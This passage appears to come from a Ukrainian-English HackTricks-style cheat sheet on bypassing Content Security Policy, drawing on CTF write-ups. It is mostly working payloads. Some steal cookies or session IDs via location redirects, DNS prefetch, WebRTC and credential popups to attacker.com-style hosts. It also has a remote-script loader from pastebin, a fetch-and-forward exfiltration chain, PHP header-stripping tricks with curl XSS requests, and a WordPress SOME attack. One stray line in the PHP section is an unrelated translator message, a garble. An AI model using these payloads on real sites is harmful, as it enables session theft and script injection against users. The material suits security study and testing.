Якщо вам вдасться змусити сервер відповісти заголовком **`Content-Security-Policy-Report-Only`** зі **значенням, яке контролюєте ви** (можливо через CRLF), ви можете вказати його на ваш сервер, і якщо ви **обгорнете** **JS content**, який хочете ексфільтрувати, тегом **`<script>`**, і оскільки дуже ймовірно, що `unsafe-inline` не дозволений CSP, це **спровокує помилку CSP**, і частина скрипта (що містить чутливу інформацію) буде відправлена на сервер через `Content-Security-Policy-Report-Only`.

For an example [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking інформації з CSP та iframe

- Створюється `iframe`, що вказує на URL (назвемо його `https://example.redirect.com`), який дозволений CSP.
- Цей URL потім перенаправляє на секретний URL (наприклад, `https://usersecret.example2.com`), який **не дозволений** CSP.
- Прослуховуючи подію `securitypolicyviolation`, можна отримати властивість `blockedURI`. Ця властивість розкриває домен заблокованого URI, що призводить до leak секретного домену, на який перенаправляв початковий URL.

Цікавий момент: браузери, як Chrome і Firefox, поводяться по-різному при обробці iframe щодо CSP, що може призвести до потенційного leak чутливої інформації через невизначену поведінку.

Інша техніка полягає в експлуатації самого CSP, щоб вивести секретний subdomain. Цей метод базується на binary search algorithm і на налаштуванні CSP для включення певних доменів, які навмисно блокуються. Наприклад, якщо секретний subdomain складається з невідомих символів, ви можете ітеративно тестувати різні subdomains, змінюючи CSP directive щоб блокувати або дозволяти ці subdomains. Ось фрагмент, що показує, як CSP може бути налаштований для полегшення цього методу:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Спостерігаючи, які запити блокуються або дозволяються CSP, можна звузити множину можливих символів у секретному піддомені і зрештою виявити повний URL.

Обидва методи експлуатують нюанси реалізації CSP та поведінки в браузерах, показуючи, як на вигляд безпечні політики можуть ненавмисно leak конфіденційної інформації.

Trick from [**here**](https://ctftime.org/writeup/29310).

## Небезпечні технології для обходу CSP

### PHP-помилки при занадто великій кількості параметрів

Згідно з [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), відправка надто великої кількості параметрів (1001 GET parameters хоча це також можна зробити з POST params і більше ніж 20 файлів). Будь-який визначений **`header()`** в PHP web-коді **не буде надісланий** через помилку, яку це спричинить.

### PHP response buffer overload

Відомо, що PHP за замовчуванням **буферизує відповідь до 4096** байт. Тому, якщо PHP показує warning, надавши **достатньо даних у warning'ах**, **response** буде **відправлено** **перед** **CSP header**, що спричинить ігнорування заголовка.\
Отже, техніка по суті полягає у **заповненні буфера відповіді warning'ами**, щоб CSP header не був надісланий.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Kill CSP via max_input_vars (headers already sent)

Оскільки заголовки повинні бути надіслані перед будь-яким виводом, warning'и, які видає PHP, можуть зробити недійсними подальші виклики `header()`. Якщо введення користувача перевищує `max_input_vars`, PHP спочатку викидає startup warning; будь-який наступний `header('Content-Security-Policy: ...')` завершиться помилкою “headers already sent”, фактично відключаючи CSP і дозволяючи інакше заблокований reflective XSS.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Ви не надали вміст файлу для перекладу. Будь ласка, вставте вміст README.md (або вкажіть текст), який потрібно перекласти на українську.
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Перезапис сторінки помилки

Згідно з [**this writeup**](https://blog.ssrf.kr/69), схоже, було можливо обійти захист CSP, завантаживши сторінку помилки (ймовірно без CSP) й перезаписавши її вміст.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME — це техніка, яка зловживає XSS (або дуже обмеженим XSS) **in an endpoint of a page** для **abuse** **other endpoints of the same origin.** Це робиться шляхом завантаження уразливого endpoint з attacker page, а потім перезавантаження attacker page на реальний endpoint в тому ж origin, який ви хочете зловживати. Таким чином **vulnerable endpoint** може використовувати об'єкт **`opener`** у **payload**, щоб **access the DOM** реального endpoint для зловживання. Для детальнішої інформації дивись:


{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Крім того, **wordpress** має **JSONP** endpoint у `/wp-json/wp/v2/users/1?_jsonp=data`, який буде **reflect** **data**, надіслані у вихід (з обмеженням лише літер, цифр та крапок).

An attacker can abuse that endpoint to **generate a SOME attack** against WordPress and **embed** it inside `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` note that this **script** will be **loaded** because it's **allowed by 'self'**. Moreover, and because WordPress is installed, an attacker might abuse the **SOME attack** through the **vulnerable** **callback** endpoint that **bypasses the CSP** to give more privileges to a user, install a new plugin...\
For more information about how to perform this attack check [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Якщо є сувора CSP, яка не дозволяє вам **interact with external servers**, є деякі речі, які ви завжди можете зробити, щоб exfiltrate інформацію.

### Location

Ви можете просто оновити location, щоб відправити на attacker's server секретну інформацію:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Ви можете перенаправити, вставивши meta tag (це лише перенаправлення, воно не призведе до leak вмісту)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Щоб завантажувати сторінки швидше, браузери попередньо розв'язують імена хостів у IP-адреси та кешують їх для подальшого використання.\
Ви можете вказати браузеру попередньо розв'язати ім'я хоста за допомогою: `<link rel="dns-prefetch" href="something.com">`

Ви можете зловживати цією поведінкою, щоб **exfiltrate sensitive information via DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Інший спосіб:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Щоб уникнути цього, сервер може надіслати HTTP-заголовок:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Схоже, ця техніка не працює в headless browsers (bots)

### WebRTC

На кількох сторінках можна прочитати, що **WebRTC не перевіряє політику `connect-src` у CSP**.

Насправді ви можете _leak_ інформацію, використовуючи _DNS request_. Перегляньте цей код:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Ще один варіант:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

The credential popup надсилає DNS-запит до iconURL без обмежень з боку сторінки. Працює лише в безпечному контексті (HTTPS) або на localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Перевірка політик CSP онлайн

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Автоматичне створення CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Джерела

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
